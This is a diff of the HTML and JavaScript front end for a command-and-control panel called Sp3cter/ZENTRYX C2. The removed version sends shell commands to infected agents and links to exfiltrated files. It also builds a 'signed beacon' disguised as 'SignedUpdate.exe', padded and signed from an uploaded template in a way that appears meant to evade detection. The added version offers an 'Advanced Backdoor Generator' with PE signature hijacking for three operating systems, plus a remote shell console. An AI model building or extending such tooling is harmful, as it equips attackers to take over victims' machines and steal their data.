@@ -1,125 +1,217 @@
 <!DOCTYPE html>
-<html lang="es">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>👻 Sp3cter</title>
-    <style>
-        :root { --aqua-blue: #5dade2; --aqua-dark: #2e86c1; --accent: #00ffcc; --bg: #0a0a0a; --panel: #1a1a1a; --text: #e0e0e0; }
-        * { box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
-        body, html { height: 100vh; margin: 0; background: var(--bg); color: var(--text); overflow: hidden; }
-        .main-layout { display: flex; flex-direction: column; height: 100vh; }
-        header { height: 35px; background: linear-gradient(to bottom, #444, #222); display: flex; align-items: center; padding: 0 20px; border-bottom: 1px solid #000; font-size: 0.75rem; font-weight: bold; color: #888; }
-        .config-bar { height: 70px; background: var(--panel); display: flex; align-items: center; padding: 0 25px; gap: 15px; border-bottom: 1px solid #333; }
-        .progress-container { height: 40px; background: #111; padding: 0 25px; border-bottom: 1px solid #222; display: none; align-items: center; gap: 20px; }
-        .aqua-progress-bg { flex: 1; height: 10px; background: #000; border-radius: 10px; overflow: hidden; border: 1px solid #333; }
-        .aqua-progress-bar { width: 0%; height: 100%; background: linear-gradient(to bottom, #5dade2, #2e86c1); border-radius: 10px; transition: width 0.3s ease; box-shadow: 0 0 8px var(--aqua-blue); position: relative; }
-        .agents-zone { height: 160px; overflow-y: auto; background: #0d0d0d; border-bottom: 1px solid #222; padding: 10px 20px; }
-        table { width: 100%; border-collapse: collapse; }
-        th { text-align: left; padding: 8px; font-size: 0.65rem; color: #555; text-transform: uppercase; border-bottom: 1px solid #222; }
-        td { padding: 8px; background: #121212; color: #999; font-size: 0.8rem; cursor: pointer; border-bottom: 1px solid #1a1a1a; }
-        .selected-row td { background: #1c2a38 !important; color: var(--aqua-blue); border-bottom: 1px solid var(--aqua-blue); }
-        .terminal-container { flex: 1; margin: 15px 20px; display: flex; flex-direction: column; background: #000; border: 1px solid #333; border-radius: 12px; box-shadow: 0 10px 40px rgba(0,0,0,0.6); overflow: hidden; }
-        #console-output { flex: 1; padding: 20px; overflow: auto; font-family: 'Consolas', monospace !important; font-size: 14px; line-height: 1.2; white-space: pre !important; color: #ccc; margin: 0; }
-        .task-line { color: var(--accent); font-weight: bold; }
-        .dl-box { display: inline-block; white-space: normal; margin: 10px 0; padding: 12px; border: 1px solid var(--aqua-dark); background: rgba(46,134,193,0.15); border-radius: 10px; font-family: 'Segoe UI', sans-serif; vertical-align: middle; }
-        .terminal-input-line { background: #080808; padding: 12px 20px; border-top: 1px solid #222; display: flex; align-items: center; gap: 12px; }
-        .path-label { color: var(--accent); font-weight: bold; font-family: 'Consolas', monospace; font-size: 0.9rem; white-space: nowrap; }
-        .cmd-box { flex: 1; background: transparent; border: none; color: #fff; outline: none; font-size: 0.9rem; font-family: 'Consolas', monospace; }
-        .input-aqua { background: #000; border: 1px solid #444; border-radius: 15px; color: #fff; padding: 5px 12px; font-size: 0.8rem; outline: none; width: 150px; }
-        .btn-aqua { background: linear-gradient(to bottom, #5dade2, #2e86c1); border: none; border-radius: 20px; color: white; padding: 8px 22px; font-size: 0.7rem; font-weight: bold; cursor: pointer; box-shadow: 0 2px 4px #000; }
-        .btn-clip { background: #333; border-radius: 50%; width: 32px; height: 32px; display: flex; align-items: center; justify-content: center; cursor: pointer; border: 1px solid #555; }
-    </style>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Sp3cter C2</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
+
+<link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
 </head>
 <body>
-<div class="main-layout">
-    <header>👻 Sp3cter</header>
-    <div class="config-bar">
-        <label style="font-size:0.65rem">LHOST</label><input type="text" id="v_host" class="input-aqua">
-        <label style="font-size:0.65rem">LPORT</label><input type="text" id="v_port" value="5000" class="input-aqua" style="width:70px">
-        <div class="btn-clip" onclick="document.getElementById('sig_file').click()">📎</div>
-        <input type="file" id="sig_file" style="display:none" onchange="document.getElementById('fn').innerText = this.files[0].name.substring(0,12)">
-        <span id="fn" style="font-size:0.6rem; color:#444; width:80px; overflow:hidden;">No template</span>
-        <div style="flex-grow:1"></div>
-        <button class="btn-aqua" id="gen-btn" onclick="compile()">GENERATE SIGNED BEACON</button>
+
+<div class="app-shell">
+
+  <!-- TOP HEADER -->
+  <header class="topbar panel">
+   <div class="brand-wrap" style="display: flex; align-items: center; gap: 30px;">
+                <div style="display: flex; align-items: center;">
+                    <div class="brand-logo">C2</div>
+                    <div class="brand-divider"></div>
+                    <div class="brand-title">ZENTRYX<span>C&C</span></div>
+                </div>
+                
+                <!-- SECCIÓN DE LEDS INDICADORES DE POTENCIA -->
+                <div class="topbar-status-center" style="display: flex; gap: 20px; align-items: center; font-family: 'JetBrains Mono', monospace; font-size: 11px; margin-left: 10px; border-left: 1px solid rgba(255,255,255,0.08); padding-left: 20px; height: 20px;">
+                    <!-- LED 1: Compilador -->
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span class="led led-green" style="width: 8px; height: 8px; background-color: #51d87d; border-radius: 50%; box-shadow: 0 0 8px #51d87d; display: inline-block;"></span>
+                        <span style="color: #7f95a6;">Compiler:</span> <b style="color: #fff;">OK</b>
+                    </div>
+                    
+                    <!-- LED 2: Motor de Firmas -->
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span class="led led-green" style="width: 8px; height: 8px; background-color: #51d87d; border-radius: 50%; box-shadow: 0 0 8px #51d87d; display: inline-block;"></span>
+                        <span style="color: #7f95a6;">PE Signature Engine:</span> <b style="color: #fff;">READY</b>
+                    </div>
+                    
+                    <!-- LED 3: Buffer de Inflación -->
+                    <div style="display: flex; align-items: center; gap: 8px;">
+                        <span class="led led-green" style="width: 8px; height: 8px; background-color: #51d87d; border-radius: 50%; box-shadow: 0 0 8px #51d87d; display: inline-block;"></span>
+                        <span style="color: #7f95a6;">Inflation Buffer:</span> <b style="color: #fff;">ACTIVE</b>
+                    </div>
+                </div>
+            </div>
+
+    <div class="topbar-right">
+      <div class="clock">23:48</div>
+      <div class="topbar-divider"></div>
+         <div class="operator">
+      <div class="operator-info">
+        <span>Offensive Security Analyst</span>
+        <a href="/logout" class="logout-link">TERMINATE_SESSION</a>
+      </div>
+      <div class="avatar"></div>
     </div>
-    <div class="progress-container" id="prog-cont">
-        <span id="prog-text" style="font-size:0.6rem; color:var(--aqua-blue); font-weight:bold; width:200px;">STATUS: STANDBY</span>
-        <div class="aqua-progress-bg"><div class="aqua-progress-bar" id="prog-bar"></div></div>
+  </div>
+  </header>
+
+  <!-- LEFT SIDEBAR -->
+  <aside class="sidebar panel">
+    <div class="sidebar-head">
+      <h3>BEACONS & AGENTS</h3>
+      <span>•••</span>
     </div>
-    <div class="agents-zone"><table><thead><tr><th>ID</th><th>HOSTNAME</th><th>IP</th><th>LAST SEEN</th></tr></thead><tbody id="agent-list"></tbody></table></div>
-    <div class="terminal-container">
-        <div id="console-output">[*] SP3CTER TERMINAL INITIALIZED...</div>
-        <div class="terminal-input-line">
-            <span class="path-label" id="path-label">C:\></span>
-            <input type="text" id="cmd-input" class="cmd-box" placeholder="Execute command..." onkeypress="handleCommand(event)">
+
+    <div class="status-switch">
+      <button class="active">Equipo</button>
+      <button class="active">Status</button>
+    </div>
+
+    <div class="table-head">
+      <span>UNITS</span>
+      <span>LABELS</span>
+    </div>
+
+    <div class="agents-list" id="agents-container">
+    <!-- Se llenará solo mediante app.js -->
+</div>
+
+    <div class="sidebar-footer">
+      <div class="mini-btn">⌨</div>
+      <div class="mini-btn">⚙</div>
+    </div>
+  </aside>
+
+  <!-- TOP METRICS -->
+<section class="cards-row">
+  <!-- Tarjeta 1: Estado de Conexión -->
+<div class="metric-card panel">
+    <h4>MISSION STATUS</h4>
+
+    <div class="metric-content">
+        <div class="metric-main status-main" id="status-text">
+            DISCONNECTED
         </div>
     </div>
-</div>
-<script>
-    let selectedAgent = null; let agentHistory = {};
-    window.onload = () => { document.getElementById('v_host').value = window.location.hostname; };
 
-    function addLog(msg, type = "output", aid = null) {
-        const target = aid || selectedAgent; if (!target) return;
-        if (!agentHistory[target]) agentHistory[target] = "";
-        let content = msg;
-        if (msg.includes('---PATH---')) {
-            const pts = msg.split('---PATH---');
-            content = pts[0];
-            document.getElementById('path-label').innerText = pts[1].trim() + ">";
-        }
-        let formatted = (type === "task") ? `\n<span class="task-line">> ${msg}</span>\n` : content.replace(/d-----/g, '<span style="color:orange">d-----</span>').replace(/-a----/g, '<span style="color:var(--aqua-blue)">-a----</span>');
-        agentHistory[target] += formatted;
-        if (target === selectedAgent) { const out = document.getElementById('console-output'); out.innerHTML = agentHistory[selectedAgent]; out.scrollTop = out.scrollHeight; }
-    }
+    <p class="metric-label" id="status-desc">
+        C2 Sync required
+    </p>
+</div
+ <!-- Tarjeta 2: Active Beacons -->
+    <div class="metric-card panel">
+        <h4>ACTIVE BEACONS</h4>
+        <div class="metric-content">
+            <div class="metric-big" id="beacon-count-big">1<span>/ 10</span></div>
+            <p class="metric-label">Beacons active</p>
+        </div>
+    </div>
 
-    async function fetchAgents() {
-        try {
-            const r = await fetch('/api/v1/operator/list'); const data = await r.json();
-            const list = document.getElementById('agent-list'); list.innerHTML = '';
-            for (const id in data) {
-                const tr = document.createElement('tr'); if(selectedAgent === id) tr.className = 'selected-row';
-                tr.onclick = () => { selectedAgent = id; document.getElementById('console-output').innerHTML = agentHistory[id] || ''; fetchAgents(); };
-                tr.innerHTML = `<td>${id}</td><td>${data[id].hostname}</td><td>${data[id].ip}</td><td>${data[id].last_seen}</td>`;
-                list.appendChild(tr);
-            }
-        } catch(e) {}
-    }
+    <!-- Tarjeta 3: Online Operators -->
+    <div class="metric-card panel">
+        <h4>ONLINE OPERATORS</h4>
+        <div class="metric-content">
+            <div class="metric-big" id="operator-count-big">0<span>/ 10</span></div>
+            <p class="metric-label">Admin sessions</p>
+        </div>
+    </div>
 
-    async function fetchResults() {
-        if (!selectedAgent) return;
-        const r = await fetch(`/api/v1/operator/results/${selectedAgent}`); const data = await r.json();
-        data.results.forEach(res => addLog(res, "output"));
-        data.files.forEach(f => {
-            const html = `\n<div class="dl-box"><span style="color:var(--aqua-blue); font-weight:bold;">[+] EXFILTRATION SUCCESS: </span><a href="/api/v1/operator/download_file/${selectedAgent}/${f}" target="_blank" style="color:var(--accent); font-weight:bold; text-decoration:underline;">DOWNLOAD ${f}</a></div>\n`;
-            agentHistory[selectedAgent] += html;
-            if (selectedAgent) { document.getElementById('console-output').innerHTML = agentHistory[selectedAgent]; }
-        });
-    }
+    <!-- Tarjeta 4: Alerts -->
+    <div class="metric-card panel danger-card">
+        <h4>ALERTS</h4>
+        <div class="metric-content">
+            <div class="metric-big red-text" id="alert-count">0</div>
+            <p class="metric-label">Requires attention</p>
+        </div>
+    </div>
+</section>
 
-    function handleCommand(e) { if (e.key === 'Enter' && e.target.value.trim() !== '') { fetch('/api/v1/operator/push', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({id:selectedAgent, cmd:e.target.value})}); addLog(e.target.value, "task"); e.target.value = ''; } }
-    
-    function setProgress(val, text) { document.getElementById('prog-bar').style.width = val + "%"; document.getElementById('prog-text').innerText = "STATUS: " + text.toUpperCase(); }
-    async function compile() {
-        const cont = document.getElementById('prog-cont'); const btn = document.getElementById('gen-btn');
-        cont.style.display = "flex"; btn.disabled = true; setProgress(15, "Compilando...");
-        const fd = new FormData();
-        fd.append('v_host', document.getElementById('v_host').value);
-        fd.append('v_port', document.getElementById('v_port').value);
+<aside class="rightbar" style="display: flex; flex-direction: column; height: 100%;">
+    <!-- GENERADOR DE AGENTES AVANCED (UNIFICADO Y EXPANDIDO) -->
+    <div class="panel widget generator" style="display: flex; flex-direction: column; height: 100%; box-sizing: border-box;">
+        <h3 class="widget-title" style="margin-bottom: 15px;">ADVANCED BACKDOOR GENERATOR</h3>
         
-        // FIX CRÍTICO: Mandar el archivo real (.files[0])
-        const fileInput = document.getElementById('sig_file');
-        if (fileInput.files.length > 0) fd.append('template_file', fileInput.files[0]);
+        <label>TARGET OS</label>
+        <select id="v_os" class="fake-input" style="background:#1a252f; border:1px solid rgba(255,255,255,0.05); color:#fff; width:100%; height:32px; border-radius:6px; padding:0 10px; margin-bottom:12px; box-sizing: border-box;">
+            <option value="windows" selected>Windows (.EXE)</option>
+            <option value="linux">Linux (.ELF)</option>
+            <option value="mac">macOS (.MACH-O)</option>
+        </select>
 
-        let p = 15; const interval = setInterval(() => { if (p < 90) { p += 2; setProgress(p, p < 50 ? "Bloating..." : "Signing..."); } }, 400);
-        try {
-            const r = await fetch('/generate', { method: 'POST', body: fd });
-            clearInterval(interval); if (!r.ok) throw new Error(); setProgress(100, "¡Done!");
-            const b = await r.blob(); const a = document.createElement('a'); a.href = URL.createObjectURL(b); a.download = "SignedUpdate.exe"; a.click();
-        } catch(e) { clearInterval(interval); setProgress(0, "Error"); }
-        finally { setTimeout(() => { cont.style.display = "none"; btn.disabled = false; }, 3000); }
-    }
-    setInterval(fetchAgents, 3000); setInterval(fetchResults, 2000);
-</script>
+        <label>TARGET IP/HOST</label>
+        <input type="text" id="v_host" name="v_host" class="fake-input" placeholder="e.g., 192.168.1.100" style="margin-bottom:12px;">
+        
+        <label>PORT</label>
+        <input type="text" id="v_port" name="v_port" class="fake-input" placeholder="e.g., 5000" style="margin-bottom:12px;">
+
+        <div style="display: flex; gap: 10px; margin-bottom: 12px;">
+            <div style="flex: 1;">
+                <label>BEACON INTERVAL (s)</label>
+                <input type="number" id="v_interval" class="fake-input" value="5" min="1" style="width: 100%; box-sizing: border-box;">
+            </div>
+            <div style="flex: 1;">
+                <label>INFLATION BUFFER (MB)</label>
+                <input type="number" id="v_inflation" class="fake-input" value="50" min="0" style="width: 100%; box-sizing: border-box;">
+            </div>
+        </div>
+
+        <!-- Contenedor con Flex para alinear perfectamente la caja de texto y el botón Attach -->
+        <div id="windows-options" style="margin-bottom: 15px;">
+            <label>PE HIJACKING SIGNATURES</label>
+            <div style="display: flex; width: 100%; height: 32px; box-sizing: border-box;">
+                <input type="file" id="template_file" name="template_file" style="display:none;">
+                <div id="file-name-display" style="border: 1px solid rgba(255,255,255,.08); border-right: none; border-radius: 6px 0 0 6px; background: #172433; padding: 0 12px; font-size: 12px; flex: 1; overflow: hidden; display: flex; align-items: center; white-space: nowrap; text-overflow: ellipsis; height: 100%; box-sizing: border-box; color: #7f95a6;">No file selected</div>
+                <button type="button" class="btn-attach" onclick="document.getElementById('template_file').click()" style="border: 1px solid rgba(255,255,255,.08); border-radius: 0 6px 6px 0; background: var(--cyan); color: #000; font-weight: bold; padding: 0 15px; cursor: pointer; font-size: 11px; height: 100%; box-sizing: border-box; transition: opacity 0.2s;">Attach EXE</button>
+            </div>
+        </div>
+
+        <button class="generate-btn" id="btn-generate" onclick="triggerPayloadGeneration()" style="margin-top: 5px; margin-bottom: 15px; width: 100%; height: 36px; box-sizing: border-box;">GENERATE & ENCRYPT</button>
+
+        <!-- Contenedor dinámico que se estira y ocupa todo el espacio inferior restante sin dejar huecos -->
+        <div id="generation-status-box" style="display: none; flex: 1; flex-direction: column; border-top: 1px solid rgba(255,255,255,0.08); padding-top: 12px; box-sizing: border-box; min-height: 0;">
+            <div style="display: flex; justify-content: space-between; font-size: 11px; margin-bottom: 5px;">
+                <span id="progress-phase-text" style="color: var(--cyan);">INITIATING...</span>
+                <span id="progress-percent">0%</span>
+            </div>
+            <!-- Barra de progreso -->
+            <div style="width: 100%; height: 6px; background: rgba(255,255,255,0.1); border-radius: 3px; overflow: hidden; margin-bottom: 12px; min-height: 6px;">
+                <div id="generation-progress-bar" style="width: 0%; height: 100%; background: linear-gradient(90deg, var(--cyan), var(--green)); transition: width 0.3s ease;"></div>
+            </div>
+            
+            <label style="font-size: 10px; color: var(--muted); margin-bottom: 5px; display: block;">COMPILATION VERBOSE OUTPUT</label>
+            <!-- Cuadro Verbose estirado dinámicamente ocupando el 100% de la base disponible -->
+            <div id="generation-verbose" style="flex: 1; width: 100%; background: #080f16; border: 1px solid rgba(255,255,255,0.05); border-radius: 6px; padding: 10px; font-family: 'JetBrains Mono', monospace; font-size: 10px; color: #51d87d; overflow-y: auto; white-space: pre-wrap; line-height: 1.4; box-sizing: border-box;"></div>
+            
+            <div class="success-msg" id="success-msg" style="display: none; margin-top: 10px; font-size: 12px; line-height: 1.3; min-height: auto;">
+                Agent payload successfully created and encrypted.
+            </div>
+        </div>
+    </div>
+</aside>
+
+  <!-- CONSOLE -->
+<section class="console panel">
+  <div class="console-title">SHELL EXEC <span id="active-target" style="color:var(--cyan); margin-left:10px;">[NO AGENT SELECTED]</span></div>
+
+  <div class="console-wrapper" style="height: calc(100% - 40px); display: flex; flex-direction: column;">
+    <!-- Área donde se ven los logs -->
+    <pre id="console-pre" style="flex: 1; overflow-y: scroll; scroll-behavior: smooth; padding: 15px; background: rgba(0,0,0,0.15); border-radius: 4px; margin-bottom: 10px; min-height: 0; max-height: calc(100vh - 420px);">
+    </pre>
+    
+    <!-- Input para escribir comandos -->
+  <div class="command-line">
+    <span id="shell-path">C:\></span>
+    <span class="prompt-symbol">>></span>
+    <input type="text" id="shell-input" placeholder="Type a command...">
+</div>
+  </div>
+</section>
+
+</div>
+<script src="{{ url_for('static', filename='js/app.js') }}"></script>
 </body>
 </html>
